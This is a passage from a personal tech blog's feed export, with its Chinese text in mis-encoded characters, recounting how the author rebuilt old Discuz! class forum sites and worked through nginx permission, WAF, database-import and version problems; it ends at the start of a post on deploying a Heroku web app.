src="/2020/01/09/Idea_RebuildClassWebsite/error_log.png"></p><p>å¤åˆ¶ç²˜è´´æœäº†ä¸€ä¸‹ï¼Œæ€€ç–‘æ˜¯åŠ¨æ€é“¾æ¥åº“çš„é—®é¢˜ï¼Œäºæ˜¯<code>ln</code>å°è¯•åˆ›å»ºé“¾æ¥ï¼Œç„¶è€Œä¸æˆåŠŸã€‚</p><p>ç„¶åä¸æƒ³ç®¡äº†ï¼Œå…³é—­<code>nginx</code>æœåŠ¡ï¼Œå¯åŠ¨<code>apache</code>æœåŠ¡ï¼Œè¿™å›è¿˜æ˜¯<strong>403</strong>ï¼Œå…¶ä»–çš„ç½‘ç«™å°±æ²¡é—®é¢˜ï¼Œç»äº†ã€‚</p><p>æ¢å›<code>nginx</code>ï¼Œå°†é…ç½®æ–‡ä»¶ä¸­çš„<code>user</code>ç”±<code>www</code>æ›´æ”¹ä¸º<code>root</code>ï¼Œå†è¯•å±…ç„¶å¥½äº†ï¼çœ‹æ¥æœç„¶æ˜¯<strong>æƒé™çš„é—®é¢˜</strong>ï¼Œç„¶è€Œæˆ‘ä¹‹å‰å¥½åƒå¹¶æ²¡æœ‰æ”¹è¿‡ä»€ä¹ˆé…ç½®ï¼Œä¹Ÿä¸æ¸…æ¥š<code>www</code>ç”¨æˆ·ä¸ºå•¥å°±æ²¡æƒé™äº†ã€‚</p><p><code>root</code>æ¯•ç«Ÿä¸å¤ªå®‰å…¨å§ï¼Œäºæ˜¯åˆæ”¹äº†å›å»ï¼Œ403äº†ã€‚</p><p>ç™»å½•æœåŠ¡å™¨çœ‹äº†ä¸€ä¸‹ï¼Œå‡ ä¸ªç½‘ç«™ç›®å½•ä¸‹å°±åªæœ‰æ–°å»ºçš„è¿™ä¸ªç”¨æˆ·ç»„æ˜¯<code>root</code>ï¼Œä¿®æ”¹äº†ç›®å½•æƒé™ï¼Œå…è®¸othersæ‰§è¡Œï¼Œå†è®¿é—®ï¼Œæ²¡é—®é¢˜äº†ã€‚</p><p>ä½†å¾ˆå¥‡æ€ªå•Šä¸ºå•¥å°±ä¸è¡Œå•Šã€‚</p><p>äºæ˜¯åˆé‡è£…äº†ä¸€æ¬¡<code>nginx</code>ï¼ŒåŒæ—¶è¿˜å¸æ‰äº†å®ƒçš„é˜²ç«å¢™ï¼Œè¿™æ¬¡æ²¡é—®é¢˜äº†emmmã€‚å†è£…å›é˜²ç«å¢™ï¼Œåˆç‚¸äº†ã€‚</p><p>WAFçš„é—®é¢˜å•Šã€‚</p><p>è¿™æ—¶å€™åå°æ”¹å‚æ•°ä¹Ÿæœ‰æŠ¥æ— æƒé™çš„ï¼Œå°±å¾ˆæ‡µé€¼ã€‚</p><p>äºæ˜¯å¹²è„†ç›´æ¥<code>reboot</code>å¥½äº†ã€‚</p><p><strong><em>ï¼ˆæœ‰å¥è¯è¯´å¾—å¥½ï¼Œé‡å¯è§£å†³ç»å¤§éƒ¨åˆ†é—®é¢˜</em></strong></p><p>è¿›å…¥åå°ï¼Œå…ˆå…³é—­<code>nginx</code>ï¼Œé‡è£…WAFï¼Œå†å¼€å¯<code>nginx</code>ã€‚è¿™å›ç»ˆäºæ²¡æ¯›ç—…äº†ã€‚ï¼ˆx</p><br><hr><h3 id=""><a href="#" class="headerlink" title=""></a><br></h3><h3 id="é‡å»º8ç­ç­ç½‘"><a href="#é‡å»º8ç­ç­ç½‘" class="headerlink" title="é‡å»º8ç­ç­ç½‘"></a>é‡å»º8ç­ç­ç½‘</h3><p>é‡å»ºå…¶å®ç±»ä¼¼äºæ¬å®¶ï¼Œäºæ˜¯çœ‹äº†å‡ ç¯‡å…³äº<code>Discuz!</code>æ¬å®¶çš„æ•™ç¨‹ï¼Œå‘ç°è·ä»Šéƒ½æœ‰ä¸€æ®µå†å²äº†ã€‚</p><p>å»å®˜æ–¹è®ºå›æ‰¾åˆ°äº†æœ€æ–°çš„<strong>X3.4ç‰ˆæœ¬</strong>çš„ä¸‹è½½é“¾æ¥ï¼Œå‘ç°æŒ‡å‘äº†giteeï¼Œåˆšå¼€å§‹è¿˜è§‰å¾—æœ‰ç‚¹æ„æ€ï¼Œç„¶è€Œå½“æˆ‘ç‚¹å¼€é“¾æ¥å‘ç°è¿æ¥ä¸ä¸ŠgiteeæœåŠ¡å™¨ï¼Œéš¾é“ç‚¸äº†ï¼Ÿï¼Ÿï¼Ÿæ¢äº†ä¸€ä¸ªç½‘ç»œï¼Œè¿ä¸Šäº†ã€‚ï¼ˆåæ§½ä¸€ä¸‹è¾£é¸¡å®½å¸¦ï¼Œä¼°è®¡æ˜¯DNSå‡ºäº†ç‚¹é—®é¢˜8  </p><p><strong>å•Šä¸æ˜¯ï¼ï¼ï¼</strong></p><p>åˆ«æƒ³ç€å•¥éƒ½æƒ³è£…æœ€æ–°çš„ï¼Œå¾—å…ˆè€ƒè™‘ä½ è¦<strong>é‡å»º/æ¢å¤çš„ç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬</strong>çš„å•Šï¼è¿˜è¦æ³¨æ„<strong>PHPçš„ç‰ˆæœ¬</strong>ï¼Œä»¥åŠ<strong>è¯­è¨€ç¼–ç ï¼ˆGBK/UTF8/BIG5/ï¼Ÿï¼‰</strong>ï¼ˆå°±å› ä¸ºè¿™ä¸ªåˆ æ‰åˆé‡å»ºäº†å¥½å‡ ä¸ªç‰ˆæœ¬</p><p>è®ºå›çš„ç‰ˆæœ¬å¯ä»¥åœ¨ä½ å¤‡ä»½çš„æ•°æ®åº“<code>.sql</code>æ–‡ä»¶å¤´éƒ¨æ³¨é‡Šé‡Œçœ‹åˆ°ã€‚ï¼ˆè¿™ä¸ªè¿˜æ˜¯åé¢é‡å»º10ç­ç­ç½‘æ—¶æ‰å‘ç°çš„</p><p>ä¸è¦åƒæˆ‘ä¸€æ ·è£…äº†å‘ç°ç”¨ä¸äº†å˜¤å˜¤å˜¤ã€‚</p><ul><li><code>upload</code>æ–‡ä»¶å¤¹æ‰“åŒ…ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œè§£å‹ï¼Œç„¶åè®¿é—®ç½‘ç«™ã€‚</li></ul><blockquote><p>è‰æ€ä¹ˆåˆ403äº†ã€‚</p></blockquote><blockquote><p>æ£€æŸ¥äº†ä¸€ä¸‹æ–‡ä»¶å‘ç°æ˜¯rootæ‰€å±ï¼ŒåŸæ¥æ˜¯ä¹‹å‰ä¸€ç›´ä»¥rootèº«ä»½æ“ä½œçš„é—®é¢˜ï¼Œæ›´æ”¹ç”¨æˆ·ç»„ä¸º<code>www</code>ï¼Œè¿™å›èƒ½æ­£å¸¸è®¿é—®äº†ã€‚</p></blockquote><ul><li>æŒ‰ç…§å®‰è£…æµç¨‹å…¨æ–°å®‰è£…<code>Discuz!</code>ç³»ç»Ÿã€‚è¿™é‡Œçš„æ•°æ®åº“è¦è‡ªå·±æå‰å»ºå¥½ï¼Œè¡¨å‰ç¼€å’Œä½ è¦é‡å»ºçš„ä¸€è‡´ï¼Œä¸€èˆ¬å°±ä¸ç”¨æ›´æ”¹ã€‚  </li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot1.png"></p><ul><li>å®‰è£…å®Œæˆï¼Œè®¿é—®ä¸»é¡µæ˜¯é»˜è®¤çš„ç•Œé¢ã€‚ï¼ˆç•¥ï¼‰</li><li>æ ¹æ®å®˜æ–¹çš„æ¬å®¶æ•™ç¨‹ï¼ŒæŠŠ<code>utility/restore.php</code>æ–‡ä»¶ä¸Šä¼ åˆ°ç½‘ç«™çš„<code>data/</code>ç›®å½•ä¸‹ï¼Œå†æŠŠè¦æ¢å¤çš„æ•°æ®åº“æ•´ä¸ªç›®å½•ä¹Ÿä¸Šä¼ åˆ°<code>data/</code>ä¸‹ï¼Œç„¶åé€šè¿‡<code>ç½‘ç«™åŸŸå/data/restore.php</code>è®¿é—®æ•°æ®æ¢å¤é¡µé¢ã€‚</li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot2.png"></p><blockquote><p>ç„¶è€Œè¿™é‡Œæˆ‘è¢«è‡ªå·±çš„WAFç»™æ‹¦ä½äº†233ã€‚</p><p>å¼€äº†ç™½åå•å†å¯¼å…¥ï¼Œè¿™æ—¶å€™è¿‡äº†ä¸€æ®µæ—¶é—´æŠ¥<strong>504</strong>äº†emmmã€‚ï¼ˆæˆ‘åˆæ‡µäº†ï¼Œéš¾å¾—è®©æˆ‘è§åˆ°äº†å¥½å¤šé”™è¯¯é¡µé¢ï¼Œæˆ‘æ²¡äº‹çš„å˜¤å˜¤å˜¤  </p><p>é‡è¯•ï¼Œå¦‚æ—§ï¼ŒåŒæ—¶å‘ç°cpuæ˜¯100%åœ¨è·‘çš„ï¼ˆå”‰æ€§èƒ½æœç„¶ä¸å’‹æ ·ã€‚</p></blockquote><blockquote><p>æœäº†å„ç§èµ„æ–™ï¼ŒæŠŠnginxçš„è¶…æ—¶å’ŒPHPæ‰§è¡Œæ—¶é—´éƒ½æ”¹äº†ï¼Œè¿˜æ˜¯504â€¦  </p><p>çœ‹äº†ä¸€ä¸‹<code>.sql</code>æ–‡ä»¶ï¼Œå¹²è„†ä¸ç”¨æ•´ä¸ªå·¥å…·ï¼Œç›´æ¥å¯¼å…¥mysqlå¥½äº†å•¦ã€‚  </p><p>è™½ç„¶æœŸé—´è¿˜æŠ¥äº†å‡ ä¸ªé”™ï¼Œä½†è¿˜æ˜¯å¯¼å®Œäº†å‘¢ã€‚</p></blockquote><ul><li><p>è®¿é—®ä¸»é¡µï¼Œå“‡å¥½æƒŠå–œå•Šï¼Œä¹‹å‰çš„åˆ†ç±»ã€å¸–å­ä»€ä¹ˆéƒ½å›æ¥äº†ã€‚</p></li><li><p>ç”¨åŸå§‹çš„åˆ›å§‹äººè´¦å·ç™»å½•åå°ï¼Œ<strong>æ›´æ–°ç¼“å­˜</strong>ã€‚</p><blockquote><p>è¿™é‡Œä¹ŸæŠ˜è…¾äº†è€åŠå¤©ï¼Œä¸æ˜¯å®‰è£…è®ºå›ç³»ç»Ÿæ—¶å€™åˆ›å»ºçš„ï¼Œè€Œæ˜¯é‡å»ºçš„è€ç”¨æˆ·ã€‚</p><p>æ¯•ç«Ÿæ•´ä¸ªæ•°æ®åº“éƒ½æ”¹å›å»äº†å˜›ã€‚</p><p>è‡³äºå¿˜è®°å¯†ç ï¼Œemmmåé¢å†è¯´ã€‚</p></blockquote></li><li><p>å†åˆ·æ–°ä¸»é¡µï¼Œè¿™å›æ•°æ®åŸºæœ¬èƒ½æ­£å¸¸è®¿é—®äº†ï¼Œé¡µé¢é…ç½®ä¹Ÿæ¢å¤åˆ°äº†ä¹‹å‰çš„çŠ¶æ€ã€‚</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-17-56-47-58.jpg" style="max-width:40%;"></li><li><p>ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰<strong>æ¢å¤logoã€faviconã€attachmentã€avatarã€pluginã€templateç­‰ã€‚</strong></p><p>è¿™é‡Œç”±äºä¹‹å‰åªå¤‡ä»½äº†logoï¼Œå…¶ä»–æ•°æ®åŸºæœ¬æ²¡å¤‡ä»½ï¼ˆæˆ–è€…è¯´æˆ‘çš„ç¡¬ç›˜é‡Œæ²¡å¤‡ä»½ï¼‰emmmï¼Œå°±ä¹ˆçš„åŠæ³•äº†ã€‚</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-02-23-26-12.png" alt="æ¢å¤åçš„ç­ç½‘" style="max-width:50%;"></li></ul><p>çœ‹äº†çœ‹ä¸Šé¢çš„å¸–å­ï¼Œ<em>å…¨æ˜¯é»‘å†å²å•Š</em>â€¦â€¦ï¼ˆé»‘è„¸.png</p><p>ç”¨æˆ·æ•°æ®éƒ½æ¢å¤äº†ï¼Œç†è®ºä¸Šèƒ½ç”¨åŸæ¥çš„ä¿¡æ¯è¿›è¡Œç™»å½•ã€‚</p><p>ç„¶è€Œå›¾ç‰‡ä»€ä¹ˆçš„éƒ½æ²¡äº†ï¼Œä¹‹å‰å¾ˆå¤šå¤–é“¾çš„å›¾ç‰‡ã€æ’ä»¶éƒ½å¤±æ•ˆäº†ï¼Œå…¶å®é—®é¢˜ä¹Ÿä¸å¤§å§ã€‚</p><p><strong>ä¸è¿‡èƒ½é‡å»ºäº†ä¹Ÿæ€»æ¯”æ²¡æœ‰è¦å¥½å‘€ï¼å˜»å˜»å˜»ã€‚</strong></p><p>æ¯•ç«Ÿè¿™ä¸ªç‰ˆæœ¬æœ‰å¾ˆå¤šå®‰å…¨æ¼æ´äº†ï¼Œ<strong>å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œè¿™é‡Œå°±ä¸å…¬å¼€äº†å•¦</strong>ã€‚</p><p><br><br></p><hr><br><h3 id="é‡å»º10ç­ç­ç½‘"><a href="#é‡å»º10ç­ç­ç½‘" class="headerlink" title="é‡å»º10ç­ç­ç½‘"></a>é‡å»º10ç­ç­ç½‘</h3><p>ä¸Šé¢è¯´äº†äº‘å¹³å°<code>End of Life</code>çš„æ—¶å€™æ²¡æœ‰å¤‡ä»½è¿™ä¸ªæ•°æ®çš„ã€‚</p><p>ä½†æ˜¯æˆ‘æ‰¾éäº†ç¡¬ç›˜ï¼Œç»ˆäº<strong>ç¿»å‡ºäº†é‚£æ—¶å€™å¤‡ä»½çš„éƒ¨åˆ†æ•°æ®</strong>ã€‚</p><p>æœ‰äº†ä¸Šé¢é‡å»ºçš„ç»éªŒï¼Œæœ¬ä»¥ä¸ºå°±å¾ˆè½»æ¾ä¸Šæ‰‹çš„ï¼Œæ²¡æƒ³åˆ°è¿˜æ˜¯é‡åˆ°äº†ä¸€å †é—®é¢˜ã€‚  </p><p>é¦–å…ˆè¿˜æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ã€‚</p><p>æœ¬ä»¥ä¸º<code>X3.2</code>ç‰ˆæœ¬å·²ç»å¤Ÿè€äº†ï¼Œæ²¡æƒ³åˆ°è¿™é‡Œæœ€åä¸€ç›´å›é€€åˆ°äº†**<code>X2</code>ç‰ˆæœ¬**ï¼ˆå™—</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot3.png" alt="å®‰è£…è¿‡çš„ç‰ˆæœ¬"></p><p><strong><em>é¬¼æ‡‚å¾—æˆ‘é‡å»ºäº†å¤šå°‘æ¬¡ç½‘ç«™emmmm</em></strong></p><ul><li>æœŸé—´æœ‰ä¸€æ¬¡æ˜¯<strong>PHPç‰ˆæœ¬é”™äº†</strong>ï¼Œæ¯•ç«Ÿä¹‹å‰çš„ç‰ˆæœ¬ä¸€èˆ¬åªæ”¯æŒ5.xæ¥ç€ï¼Œç„¶åæˆ‘è£…äº†7.xã€‚</li></ul><ul><li>æœ‰ä¸€æ¬¡æ˜¯<strong>MySQLæ•°æ®åº“ç‚¸äº†</strong>ï¼Œè£…å®Œä¹‹åä¸»é¡µéƒ½æ‰“ä¸å¼€ï¼Œç›´æ¥æŠ¥çš„<code>database error</code>ã€‚ç„¶åå¸æ‰äº†æ•°æ®åº“ï¼Œæ¢äº†è€ä¸€ç‚¹çš„ç‰ˆæœ¬ï¼Œå‘ç°è£…å¥½äº†æ°¸è¿œå¯åŠ¨ä¸äº†ã€‚æœ€åå‘ç°æ˜¯ä¹‹å‰å¸è½½æœ‰æ®‹ç•™ï¼Œç»äº†ã€‚æ¸…äº†ä¸€éæ®‹ç•™é‡è£…ï¼Œå†é‡å¯æœåŠ¡å°±å¥½äº†ã€‚</li></ul><ul><li><p>è¿˜æœ‰ä¸€æ¬¡æ˜¯<strong>Discuzç‰ˆæœ¬</strong>è£…çš„<code>X2.5</code>ï¼Œæœ¬æ¥æŒºå¼€å¿ƒçš„ï¼Œå¯¼å®Œæ•°æ®æ›´æ–°å®Œç¼“å­˜ï¼Œç‚¹å¼€å¸–å­å°±æŠ¥<code>database error</code>ï¼Œè¯´æ‰¾ä¸åˆ°æŸæŸè®°å½•å§ã€‚æœ€åç‰ˆæœ¬é™åˆ°<code>X2</code>ç»ˆäºå¥½äº†ï¼Œä¼°è®¡æ˜¯ç‰ˆæœ¬å‡çº§è¿‡ç¨‹ä¸­ä¿®æ”¹äº†è¿™éƒ¨åˆ†æ•°æ®åº“æˆ–æ“ä½œæ•°æ®åº“çš„ä»£ç å§ã€‚</p></li><li><p>è¿˜æœ‰æ¯ä¸€æ¬¡éƒ½é‡åˆ°äº†**<code>.sql</code>å¯¼ä¸è¿›æ•°æ®åº“**çš„é—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªæ•°æ®åº“æ›´å¤§äº†ï¼Œå³ä½¿æ”¹äº†nginxå’ŒPHPçš„é…ç½®ï¼Œåœ¨ç½‘é¡µä¸Šå¯¼å…¥è¿˜æ˜¯æ°¸è¿œæŠ¥504ï¼Œæœ€åæ˜¯ä¸€è¾¹çœ‹ç€CPUçŠ¶æ€ï¼Œä¸€è¾¹ä»åå°å¯¼å…¥çš„ã€‚å‰ç«¯æŠ¥äº†504ï¼ŒCPUè¿˜åœ¨è·‘ï¼Œè™½ç„¶SQLè¿˜æŠ¥è¿‡å¥½å‡ ç§é”™ä½†æœ€åè¿˜æ˜¯å¯¼å…¥å®Œæˆäº†ã€‚ã€‚ï¼ˆæˆ‘å¤ªéš¾äº†</p></li></ul><ul><li><p>å™¢è¿˜æœ‰é‚£ä¸ª<strong>åˆ›å§‹äººå¯†ç å¿˜äº†</strong>çš„é—®é¢˜ã€‚</p><p>æŸ¥äº†ä¸€ä¸‹èµ„æ–™ï¼Œä¸€ä¸ªæ–¹æ¡ˆæ˜¯å°è¯•ç™»å½•<code>UC_Center</code>ï¼Œå¦‚æœæˆåŠŸç™»å½•çš„è¯å¯ä»¥åœ¨é‡Œé¢æ›´æ–°åˆ›å§‹äººçš„å¯†ç ï¼Œå†ç”¨æ›´æ–°åçš„å¯†ç ç™»å½•<code>Discuz</code>çš„ç®¡ç†åå°å°±è¡Œäº†ã€‚ï¼ˆè¿™é‡Œç”¨çš„å°±æ˜¯è¿™ä¸ªæ–¹æ¡ˆï¼‰</p><p>å¦ä¸€ä¸ªæ–¹æ¡ˆæ˜¯ä¿®æ”¹æ•°æ®åº“é‡Œé¢çš„ç”¨æˆ·ç›¸å…³çš„è¡¨ï¼Œå…ˆæ”¹æˆä¸€ä¸ªæ¯”è¾ƒç®€å•çš„å¯†ç ï¼ˆå¥½åƒæ˜¯MD5åŠ å¯†ï¼‰ï¼Œç™»å½•è¿›å»å†ä¿®æ”¹ã€‚è¿™é‡Œæ²¡ç”¨è¯•è¿‡å°±ä¸è¯´äº†å•¦ã€‚</p></li></ul><hr><p><strong>é‡å»ºå®Œæˆä¹‹åè®¿é—®ä¸»é¡µã€‚</strong></p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-23-23-25-80.png"></p><p>è‰ï¼ŒåŸæ¥è¿™ä¸ªæ˜¯é‚£æ—¶å€™<strong>æ›´æ–°ç‰ˆæœ¬å‰çš„æœ€åä¸€æ¬¡å¤‡ä»½</strong>emmm</p><p>ï¼ˆçœ‹äºšå­æ˜¯ç¬¬å››ä»£ï¼Œæœ€åæ›´æ–°çš„æ˜¯ç¬¬äº”ä»£äº†ï¼Œçœ‹äº†åŠå¤©æ‰æƒ³èµ·æ¥ï¼‰</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot4.png" alt="10ç­ç­ç½‘é‡å»º"></p><p>æ‰¾äº†ä¸€ä¸‹å‘ç°éƒ¨åˆ†é™„ä»¶å’Œå¤´åƒä¹‹ç±»çš„ä¹Ÿæœ‰å¤‡ä»½ï¼ˆæ›´å¤è€çš„æ•°æ®äº†ï¼‰ã€‚äºæ˜¯åˆæŠ˜è…¾äº†ä¸€ä¼šå„¿æŠŠèƒ½æ¢å¤çš„æ•°æ®ç»™æ¢å¤äº†ã€‚</p><p>äºæ˜¯ä¹æœ€åé‡å»ºå‡ºæ¥çš„æ˜¯2013å¹´1æœˆçš„å¤‡ä»½äº†ã€‚</p><p>æ€ä¹ˆè¯´å¥½å‘¢ï¼Œå…¶å®é—®é¢˜ä¹Ÿä¸å¤§å§ï¼Œ<strong>çœŸÂ·å›å¿†å•Šï¼</strong></p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-01-57-55-85.jpg" style="max-width:50%;"><p>è¿™ä¸ªç‰ˆæœ¬çš„å®‰å…¨æ¼æ´æ›´å¤šäº†ï¼ŒåŒæ ·å°±<strong>ä¸å…¬å¼€äº†ï¼Œçœ‹çœ‹å°±å¥½äº†å•¦</strong>ã€‚</p><p><br><br></p><p>emmmä¸‹é¢è¿™ä¸ªæ˜¯<strong>æ¢å¤ä¸äº†çš„ç¬¬äº”ä»£ç‰ˆæœ¬</strong>ï¼ˆçœŸå°±åªæœ‰è¿™å¼ å›¾äº†å˜¤å˜¤å˜¤ï¼‰ã€‚</p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="ç¬¬äº”ä»£ç­ç½‘" style="max-width:50%;"><p><br><br></p><hr><p><br><br></p><h2 id="ä¸€äº›æƒ³æ³•"><a href="#ä¸€äº›æƒ³æ³•" class="headerlink" title="ä¸€äº›æƒ³æ³•"></a>ä¸€äº›æƒ³æ³•</h2><ol><li><p>Linuxæƒé™ç®¡ç†è¿˜æ˜¯å¾ˆä¸¥æ ¼çš„ï¼Œè¿™å›ä½“éªŒåˆ°äº†ï¼Œæœ‰ç©ºå†ç ”ç©¶ç ”ç©¶ã€‚</p><br></li><li><p>é€‰å¯¹åˆé€‚çš„ç‰ˆæœ¬ï¼Œä¸è¦æ€»æƒ³ç€ç”¨æœ€æ–°çš„ã€‚</p><br></li><li><p>çœ‹äº†<code>Discuz!</code>ç³»ç»Ÿä¹‹å‰çš„è€ç‰ˆæœ¬ï¼Œéƒ½æ˜¯æŠŠGBKç¼–ç çš„ç‰ˆæœ¬æ”¾åœ¨å‰é¢ï¼Œä¸è¿‡ç°åœ¨éƒ½æ˜¯æ¨èå®‰è£…UTF-8ç¼–ç ç‰ˆæœ¬äº†ã€‚</p><p>åŒ…æ‹¬å…¶ä»–å¾ˆå¤šåœ°æ–¹åŸºæœ¬ä¸Šå°±UTF-8äº†ï¼Œæ„Ÿè§‰ä¹Ÿç®—æ˜¯ä¸ªè¶‹åŠ¿å§ï¼Œæ¯•ç«Ÿæ˜¯å›½é™…ç¼–ç ï¼Œé€šç”¨æ€§å¼ºå˜›ã€‚</p><br></li><li><p>å»<code>Discuz!</code>å®˜æ–¹è®ºå›çœ‹äº†çœ‹ï¼Œæ„Ÿè§‰æ˜æ˜¾å†·æ¸…äº†ã€‚åŒ…æ‹¬åœ¨åå°çœ‹æ’ä»¶åº”ç”¨å¸‚åœºï¼ŒåŸºæœ¬ä¸Šå°±å˜æˆäº†å•†ä¸šåŒ–çš„äº¤æ˜“äº†ï¼Œå°±æœ‰ç‚¹æ€€å¿µNå¹´å‰é‚£æ—¶å€™ç¤¾åŒºè¿˜å¾ˆæ´»è·ƒï¼Œæœ‰ä¸€å †å…è´¹çš„è¿˜äº’ç›¸åˆ†äº«æ¥ç€ã€‚ï¼ˆä¸è¿‡ä¹Ÿç®—æ˜¯æ—¶ä»£è¶‹åŠ¿å§233</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_plugin.png" alt="éƒ¨åˆ†ä¹‹å‰å¤‡ä»½çš„æ’ä»¶"></p><br></li><li><p>å…¶å®è¿˜æ‰¾åˆ°äº†ä»¥å‰å¯èƒ½æŠ˜è…¾è¿‡çš„å„ç§å»ºç«™ç³»ç»Ÿ233ã€‚</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_websystem.png" alt="å¯èƒ½æŠ˜è…¾è¿‡çš„å„ç§å»ºç«™ç³»ç»Ÿ"></p><br></li><li><p>ç„¶åå°±æƒ³åˆ°<strong>çº¸é£æœº</strong>äº†å˜¤å˜¤å˜¤ã€‚ä»Šå¤©å»çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°çº¸é£æœºè¿˜èƒ½è®¿é—®iï¼Œåªæ˜¯è®ºå›å…³é—­äº†ï¼Œä¸ªäººç©ºé—´å’Œè§†é¢‘åŒºè¿˜æ˜¯å¼€æ”¾çš„ï¼Œè€Œä¸”ç‰ˆæœ¬æ˜¯X3.4ç®—æ˜¯æœ€æ–°çš„å¤§ç‰ˆæœ¬äº†ã€‚ï¼ˆä¸çŸ¥é“äºè€æ¿æ˜¯ä¸æ˜¯è¿˜ç»´æŠ¤è¿‡</p><br></li><li><p>å†™è¿™ç¯‡blogçš„æ—¶å€™åˆå»<code>OpenShift</code>çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ç°åœ¨éƒ½å‡çº§åˆ° V4.2 ç‰ˆæœ¬äº†ã€‚å¢åŠ äº†å¾ˆå¤šç°åœ¨å¾ˆå®ç”¨å¾ˆçƒ­é—¨çš„<code>Serverless</code>ã€ <code>CI/CD</code>ä¹‹ç±»çš„ï¼Œç°åœ¨çš„<code>Starter plan</code>ä¹Ÿæ˜¯å…è´¹çš„ï¼Œä¸è¿‡æ„Ÿè§‰åŠ äº†ä¸å°‘é™åˆ¶å§ï¼ˆæ¯•ç«Ÿå‡å°‘æ»¥ç”¨èŠ‚çº¦èµ„æºå˜›ï¼‰ã€‚æ„Ÿå…´è¶£çš„è¿˜å¯ä»¥çœ‹çœ‹ä¸‹é¢çš„é“¾æ¥ã€‚</p></li></ol><blockquote><p>ç‰ˆæœ¬ä»‹ç»ï¼š<a href="https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/">https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/</a></p><p>äº§å“ä»‹ç»ï¼š<a href="https://www.openshift.com/products/online/">https://www.openshift.com/products/online/</a></p></blockquote><p>â€‹        <br></p><ol start="8"><li><p>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼Œ<strong>CTRL+S</strong>ä¹Ÿæ˜¯ã€‚</p><br></li><li><p>çœ‹äº†çœ‹ä¹‹å‰çš„å¸–å­ï¼Œå‘ç°å…¨éƒ½æ˜¯é»‘å†å²â€¦â€¦</p><p>ç„¶åæƒŠå–œåœ°å‘ç°ï¼Œä¹‹å‰çš„å¤–é“¾éš¾å¾—æœ‰å‡ ä¸ªè¿˜èƒ½è®¿é—®ï¼Œè¿›å»ä¸€çœ‹å‘ç°æ˜¯ä»¥å‰çš„æ•™è‚²åšå®¢ï¼Œå±…ç„¶ä¸€ç›´è¿è¥åˆ°äº†ç°åœ¨ï¼Œè€Œä¸”ä»¥å‰çš„æ–‡ç« éƒ½åœ¨ã€‚å…¨æ˜¯å›å¿†å•Šã€‚ã€‚</p><p>ç­‰æˆ‘æœ‰ç©ºå†æŠŠä¸Šé¢ä»¥å‰å‘çš„æ–‡ç« çˆ¬ä¸‹æ¥å¤‡ä»½ä¸€ä»½23333.</p><br></li><li><p>æœ‰é—®é¢˜æ¬¢è¿æ¥äº¤æµå“ˆå“ˆå“ˆã€‚</p></li></ol><p>æºœäº†æºœäº†å–µ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Discuz </tag>
            
            <tag> ç­ç½‘ </tag>
            
            <tag> é‡å»º </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAA_iCal_Webåœ¨çº¿ç‰ˆæœ¬éƒ¨ç½²</title>
      <link href="2019/12/29/Tech_NUAAiCalWeb_deploy/"/>
      <url>2019/12/29/Tech_NUAAiCalWeb_deploy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸»è¦æ˜¯ç®€å•è®°å½•ä¸€ä¸‹Herokuçš„éƒ¨ç½²ï¼Œæ¯•ç«Ÿä¸€ä¸å°å¿ƒå°±å¿˜è®°è¯¥æ€ä¹ˆæŠ˜è…¾çš„äº†â€¦</p><p>ï¼ˆå…¶å®åº”è¯¥ä¸¤å‘¨å‰å†™è¿™ç¯‡blogçš„ï¼Œç°åœ¨å·²ç»å¿˜äº†å¾ˆå¤šäº†å˜¤å˜¤å˜¤  </p></blockquote><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>ä¹‹å‰æŠ˜è…¾äº†ä¸€ä¸¤ä¸ªæœˆï¼Œåšäº†ä¸ªæŠŠè¯¾è¡¨å¯¼å‡ºåˆ°icalæ—¥å†æ–‡ä»¶çš„å°jioæœ¬ï¼Œå³ <code>NUAA_ClassSchedule</code><br>GitHubé“¾æ¥ï¼š<a href="https://github.com/miaotony/NUAA_ClassSchedule">click here</a><br><a href="https://github.com/miaotony/NUAA_ClassSchedule">https://github.com/miaotony/NUAA_ClassSchedule</a>  </p><p>å…¶ä¸­æœ‰ä¸€ä¸ªTODOæ˜¯æ­å»ºä¸€ä¸ªwebç«¯ï¼Œå®ç°åœ¨çº¿å¯¼å‡ºã€‚</p><p>å®é™…ä¸Šï¼Œåœ¨æ•™åŠ¡ç³»ç»ŸåŠ å…¥éªŒè¯ç ä¹‹å‰ï¼Œå·²ç»å’Œå¥¶å†°ä¸€èµ·åšäº†ä¸€ä¸ªå¯ä»¥ç”¨çš„webç«¯äº†ï¼Œåªä¸è¿‡åªæ˜¯ç®€å•æµ‹è¯•è¿˜æ²¡å…¬å¼€å•¥çš„ã€‚</p><p>ç„¶è€Œï¼Œè¿™ä¸ªéªŒè¯ç ä¸€åŠ 